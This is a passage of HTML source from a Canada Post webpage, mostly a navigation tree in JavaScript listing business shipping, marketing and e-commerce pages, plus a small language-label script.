                        <h3 class="submenu-header">Favourites<span class="open-new-window"></span>
                        </h3>
                        <p></p>
                      </a>
                    </div>
                    <ul>

                    </ul>
                  </div>
                </li>


              </ul>

              <ul class="menu-utility-links ">


                <li class="search-modal-quick-link">
                  <a href="https://www.canadapost-postescanada.ca/track-reperage/en" class="search-modal-link">
                    <span class="search-icon track"></span>
                    <span class="search-modal-label">Track</span>
                  </a>
                </li>
                <li class="search-modal-quick-link">
                  <a href="https://www.canadapost-postescanada.ca/info/mc/personal/postalcode/fpc.jsf" class="search-modal-link">
                    <span class="search-icon look-up-postal-code"></span>
                    <span class="search-modal-label">Find a postal code</span>
                  </a>
                </li>
                <li class="search-modal-quick-link">
                  <a href="https://www.canadapost-postescanada.ca/information/app/far/business/findARate" class="search-modal-link">
                    <span class="search-icon find-rate"></span>
                    <span class="search-modal-label">Find a rate</span>
                  </a>
                </li>
                <li class="search-modal-quick-link">
                  <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/epost.page" class="search-modal-link">
                    <span class="search-icon epost"></span>
                    <span class="search-modal-label">epost</span>
                  </a>
                </li>
                <li class="search-modal-quick-link">
                  <a href="https://www.canadapost-postescanada.ca/cpc/en/tools.page" class="see-more-tools">See more tools</a>
                </li>

              </ul>

              <ul class="menu-lang-toggle ">
                <li class="language-toggle-mobile">
                  <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#">Français</a>
                </li>
              </ul>


              <ul class="menu-cl-ctas hide">

              </ul>
              <ul class="menu-cl-utility hide">
                <li class="language-toggle-mobile">
                  <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" lang="fr">Français</a>
                </li>
              </ul>

            </div>
            </nav>
          </div>

        </div>
        <div class="mobile-active-menu-background"></div>
      </div>
      <script>
        ;(function(window, document) {
              var language = document.querySelector('html').getAttribute('lang');
              var text = language === 'en' ? 'Skip to Main Content' : 'Aller au Contenu Principal';
              document.addEventListener('DOMContentLoaded', function() { 
                document.querySelector('.cpc-skip-nav-label').innerHTML = text;
              });
            })(window, document);
      </script>
      <script type="text/javascript">
        var CPC = CPC || [];    
            CPC.globalNavigation = {
              "signInLabel": "",
              "searchLabel": "",
              "closeLabel": "",
              "utilityAriaRoleLabel": "",
              "logoAltText": "",
              "activePage": "tools/postal-indicia",
              "assetBaseUrl": "/cpc/",
              "nodes": [
              
              
                {
                  "label": "Business",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about mailing services for businesses of all sizes.",
                  
                    "link": "/cpc/en/business.page?",
                    "linkCMSPage": "business",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Shipping",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "true",
                 
                   "queryString": "Shipping overview",
                 
                    "description": "Learn about services and rates for Canadian and international shipping.",
                  
                    "link": "/cpc/en/business/shipping.page?",
                    "linkCMSPage": "business/shipping",
                  
                    "preserveQs": "true",
                  
                  "nodes": [
                    
              
                {
                  "label": "Ship in Canada",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about domestic shipping services to suit your business needs.",
                  
                    "link": "/cpc/en/business/shipping/canada.page?",
                    "linkCMSPage": "business/shipping/canada",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Find a rate and ship",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "false",
                 "preserveQs": "false",
                 
                    "description": "Learn about costs for small business and large volume shipping.",
                  
                    "link": "/cpc/en/business/shipping/find-rates-ship.page?",
                    "linkCMSPage": "business/shipping/find-rates-ship",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Snap Ship",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/find-rates-ship/snap-ship.page?",
                    "linkCMSPage": "business/shipping/find-rates-ship/snap-ship",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Shipping Manager",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/find-rates-ship/shipping-manager.page?",
                    "linkCMSPage": "business/shipping/find-rates-ship/shipping-manager",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "EST 2.0",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/find-rates-ship/est-2.page?",
                    "linkCMSPage": "business/shipping/find-rates-ship/est-2",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Compare shipping services",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about domestic shipping speeds and features.",
                  
                    "link": "/cpc/en/business/shipping/canada/compare.page?",
                    "linkCMSPage": "business/shipping/canada/compare",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Regular Parcel",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/canada/compare/regular.page?",
                    "linkCMSPage": "business/shipping/canada/compare/regular",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Expedited Parcel",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/canada/compare/expedited.page?",
                    "linkCMSPage": "business/shipping/canada/compare/expedited",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Xpresspost",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/canada/compare/xpresspost.page?",
                    "linkCMSPage": "business/shipping/canada/compare/xpresspost",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Priority",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/canada/compare/priority.page?",
                    "linkCMSPage": "business/shipping/canada/compare/priority",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "View restrictions",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about non-mailable and controlled item mail restrictions by country.",
                  
                    "link": "/cpc/en/business/shipping/restrictions.page?",
                    "linkCMSPage": "business/shipping/restrictions",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Cannabis",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/restrictions/cannabis.page?",
                    "linkCMSPage": "business/shipping/restrictions/cannabis",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Choose a shipping tool",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Compare our 3 shipping tools to find the tool for your business.",
                  
                    "link": "/cpc/en/business/shipping/compare-shipping-tools.page?",
                    "linkCMSPage": "business/shipping/compare-shipping-tools",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": " Third-party shipping software",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/third-party-shipping-software.page?",
                    "linkCMSPage": "business/shipping/third-party-shipping-software",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Ship internationally",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about international shipping services for your business needs.",
                  
                    "link": "/cpc/en/business/shipping/international.page?",
                    "linkCMSPage": "business/shipping/international",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Find a rate and ship",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about costs for small business and large volume shipping.",
                  
                    "link": "/cpc/en/business/shipping/find-rates-ship.page?",
                    "linkCMSPage": "business/shipping/find-rates-ship",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Snap Ship",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/find-rates-ship/snap-ship.page?",
                    "linkCMSPage": "business/shipping/find-rates-ship/snap-ship",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "EST 2.0",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/find-rates-ship/est-2.page?",
                    "linkCMSPage": "business/shipping/find-rates-ship/est-2",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Compare shipping services",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about U.S. and international shipping speeds and features.",
                  
                    "link": "/cpc/en/business/shipping/international/compare.page?",
                    "linkCMSPage": "business/shipping/international/compare",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Small Packet – USA",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/international/compare/small-packet-usa.page?",
                    "linkCMSPage": "business/shipping/international/compare/small-packet-usa",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Small Packet International – Air or Surface",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/international/compare/small-packet-international.page?",
                    "linkCMSPage": "business/shipping/international/compare/small-packet-international",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Tracked Packet – USA",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/international/compare/tracked-packet-usa.page?",
                    "linkCMSPage": "business/shipping/international/compare/tracked-packet-usa",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Tracked Packet – International",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/international/compare/tracked-packet-international.page?",
                    "linkCMSPage": "business/shipping/international/compare/tracked-packet-international",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Expedited Parcel – USA",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/international/compare/expedited-parcel-usa.page?",
                    "linkCMSPage": "business/shipping/international/compare/expedited-parcel-usa",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "International Parcel – Air or Surface",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/international/compare/international-parcel.page?",
                    "linkCMSPage": "business/shipping/international/compare/international-parcel",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Xpresspost – USA",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/international/compare/xpresspost-usa.page?",
                    "linkCMSPage": "business/shipping/international/compare/xpresspost-usa",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Xpresspost – International",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/international/compare/xpresspost-international.page?",
                    "linkCMSPage": "business/shipping/international/compare/xpresspost-international",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Priority Worldwide",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/shipping/international/compare/priority-worldwide.page?",
                    "linkCMSPage": "business/shipping/international/compare/priority-worldwide",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "View restrictions",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about non-mailable and controlled restrictions by country",
                  
                    "link": "/cpc/en/business/shipping/restrictions.page?",
                    "linkCMSPage": "business/shipping/restrictions",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Estimate duties and taxes",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Estimate duties and taxes",
                  
                    "link": "/information/app/wtz/business/landedCost",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Find customs codes",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/information/app/wtz/business/findHsCode",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Complete customs form",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/information/app/cdc",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Choose a shipping tool",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Compare our 3 shipping tools to find the tool for your business.",
                  
                    "link": "/cpc/en/business/shipping/compare-shipping-tools.page?",
                    "linkCMSPage": "business/shipping/compare-shipping-tools",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Track and find",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Quick links to online tools.",
                  
                    "link": "/cpc/en/business/shipping/track-find.page?",
                    "linkCMSPage": "business/shipping/track-find",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Track a package",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/track-reperage/en",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Find a postal code",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/info/mc/personal/postalcode/fpc.jsf",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Find an address",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/info/mc/personal/postalcode/fpc.jsf",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Find a post office",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/information/app/fpo/personal/findpostoffice",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Find a drop-off location",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/information/app/fdl/business/findDepositLocation",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Find a delivery standard",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/tools/delivery-standards.page?",
                    "linkCMSPage": "tools/delivery-standards",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Package Redirection",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Redirect a shipment while in transit.",
                  
                    "link": "/cpc/en/business/shipping/package-redirection.page?",
                    "linkCMSPage": "business/shipping/package-redirection",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Access our quick tools",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "false",
                 "preserveQs": "false",
                 
                    "description": "Quick links to track your parcel, find an address or postal code.",
                  
                    "link": "/cpc/en/business/shipping/track-find.page?",
                    "linkCMSPage": "business/shipping/track-find",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Snap Ship",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Online shipping tool best for small businesses.",
                  
                    "link": "/cpc/en/business/shipping/find-rates-ship/snap-ship.page?",
                    "linkCMSPage": "business/shipping/find-rates-ship/snap-ship",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Shipping Manager",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Online shipping tool for large volume shippers with a parcels contract.",
                  
                    "link": "/cpc/en/business/shipping/find-rates-ship/shipping-manager.page?",
                    "linkCMSPage": "business/shipping/find-rates-ship/shipping-manager",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Request a pickup",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Have us pick up packages from your business for shipping.",
                  
                    "link": "/cpc/en/business/shipping/request-pickup.page?",
                    "linkCMSPage": "business/shipping/request-pickup",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Simplify returns",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about how to create a returns strategy for your customers.",
                  
                    "link": "/cpc/en/business/shipping/returns.page?",
                    "linkCMSPage": "business/shipping/returns",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Customer return policy",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Create and manage return policies online, for free.",
                  
                    "link": "/cpc/en/business/shipping/returns/customer-return-policy.page?",
                    "linkCMSPage": "business/shipping/returns/customer-return-policy",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Get shipping resources and articles",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Business Matters blog.",
                  
                    "link": "/blogs/business/category/shipping/",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Marketing",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": "Marketing overview",
                 
                    "description": "Learn about direct mail campaigns and renting address data.",
                  
                    "link": "/cpc/en/business/marketing.page?",
                    "linkCMSPage": "business/marketing",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Launch a campaign",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Compare our direct mail services to match your campaign goals.",
                  
                    "link": "/cpc/en/business/marketing/campaign.page?",
                    "linkCMSPage": "business/marketing/campaign",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Reach every mailbox",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Create a direct mail campaign online or with the help of a partner.",
                  
                    "link": "/cpc/en/business/marketing/campaign/reach-every-mailbox.page?",
                    "linkCMSPage": "business/marketing/campaign/reach-every-mailbox",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Precision Targeter",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn how to target the right audience for your campaign.",
                  
                    "link": "/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter.page?",
                    "linkCMSPage": "business/marketing/campaign/reach-every-mailbox/precision-targeter",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Get to the tool",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/get-to-the-tool.page?",
                    "linkCMSPage": "business/marketing/campaign/reach-every-mailbox/precision-targeter/get-to-the-tool",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Create a mailing plan",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/create-mailing-plan.page?",
                    "linkCMSPage": "business/marketing/campaign/reach-every-mailbox/precision-targeter/create-mailing-plan",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Review your mailing plan",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/review-your-mailing-plan.page?",
                    "linkCMSPage": "business/marketing/campaign/reach-every-mailbox/precision-targeter/review-your-mailing-plan",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Map buttons",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/map-buttons.page?",
                    "linkCMSPage": "business/marketing/campaign/reach-every-mailbox/precision-targeter/map-buttons",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Data view buttons",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/data-view-buttons.page?",
                    "linkCMSPage": "business/marketing/campaign/reach-every-mailbox/precision-targeter/data-view-buttons",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Menu buttons",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/menu-buttons.page?",
                    "linkCMSPage": "business/marketing/campaign/reach-every-mailbox/precision-targeter/menu-buttons",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Snap Admail",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/sam/",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Find a partner",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/tools/marketing/find-a-partner.page?",
                    "linkCMSPage": "tools/marketing/find-a-partner",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Precision Targeter",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Precision Targeter",
                  
                    "link": "/cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter.page?",
                    "linkCMSPage": "business/marketing/campaign/reach-every-mailbox/precision-targeter",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Discover similar customers",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Effectively target potential customers using postal code data.",
                  
                    "link": "/cpc/en/business/marketing/campaign/discover-similar-customers.page?",
                    "linkCMSPage": "business/marketing/campaign/discover-similar-customers",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Send Personalized Mail",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Launch a campaign with personalized, addressed direct mail.",
                  
                    "link": "/cpc/en/business/marketing/campaign/send-personalized-mail.page?",
                    "linkCMSPage": "business/marketing/campaign/send-personalized-mail",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Why direct mail marketing?",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Our research shows how direct mail supports marketing campaigns.",
                  
                    "link": "/cpc/en/business/marketing/campaign/why-direct-mail-marketing.page?",
                    "linkCMSPage": "business/marketing/campaign/why-direct-mail-marketing",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Audience insights and solutions",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Access targeted customer lists to boost your sales.",
                  
                    "link": "/cpc/en/business/marketing/audience.page?",
                    "linkCMSPage": "business/marketing/audience",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Rent our prospect lists",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Use the most current address data to target and segment customers.",
                  
                    "link": "/cpc/en/business/marketing/audience/rent-list.page?",
                    "linkCMSPage": "business/marketing/audience/rent-list",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "NCOA Mover Data",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/audience/clean-list.page?",
                    "linkCMSPage": "business/marketing/audience/clean-list",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Clean your customer lists",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about services that increase the accuracy of customer data.  ",
                  
                    "link": "/cpc/en/business/marketing/audience/clean-list.page?",
                    "linkCMSPage": "business/marketing/audience/clean-list",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "NCOA mover data service",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/audience/clean-your-customer-lists/ncoa-mover-data-service.page?",
                    "linkCMSPage": "business/marketing/audience/clean-your-customer-lists/ncoa-mover-data-service",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Get audience insights",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Analyze campaign data to optimize future campaigns.",
                  
                    "link": "/cpc/en/business/marketing/audience/insights.page?",
                    "linkCMSPage": "business/marketing/audience/insights",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "License our data",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Use our data products to create your campaign mailing lists.",
                  
                    "link": "/cpc/en/business/marketing/audience/license-data.page?",
                    "linkCMSPage": "business/marketing/audience/license-data",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Get marketing resources and articles",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Business Matters blog.",
                  
                    "link": "/blogs/business/category/marketing/",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "E-commerce",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": " E-commerce overview",
                 
                    "description": "Learn about services to support your online business for customers.",
                  
                    "link": "/cpc/en/business/ecommerce.page?",
                    "linkCMSPage": "business/ecommerce",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Start selling online",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about setting up your online store with our partners.",
                  
                    "link": "/cpc/en/business/ecommerce/start-selling-online.page?",
                    "linkCMSPage": "business/ecommerce/start-selling-online",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "E-commerce Innovation Awards",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/ecommerce/ecommerce-awards/home.page",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Enhance your e-commerce operations",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about services to enable online purchase, delivery and returns.",
                  
                    "link": "/cpc/en/business/ecommerce/enhance.page?",
                    "linkCMSPage": "business/ecommerce/enhance",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Verify customer addresses",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Integrate AddressComplete™ to improve your online checkout experience.",
                  
                    "link": "/cpc/en/business/ecommerce/enhance/verify-addresses.page?",
                    "linkCMSPage": "business/ecommerce/enhance/verify-addresses",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Display rates and delivery dates",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Integrate shipping costs and speeds directly in your online checkout.",
                  
                    "link": "/cpc/en/business/ecommerce/enhance/display-rates-delivery-dates.page?",
                    "linkCMSPage": "business/ecommerce/enhance/display-rates-delivery-dates",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Request a pickup",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Have us pick up packages from your business for shipping.",
                  
                    "link": "/cpc/en/business/shipping/request-pickup.page?",
                    "linkCMSPage": "business/shipping/request-pickup",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Provide parcel tracking",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Add tracking to your website and let customers track their purchase.",
                  
                    "link": "/cpc/en/business/ecommerce/enhance/parcel-tracking.page?",
                    "linkCMSPage": "business/ecommerce/enhance/parcel-tracking",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Ship from a store",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Ship online purchases to customers from the closest retail store.",
                  
                    "link": "/cpc/en/business/ecommerce/enhance/ship-from-store.page?",
                    "linkCMSPage": "business/ecommerce/enhance/ship-from-store",
                  
                    "preserveQs": "false",
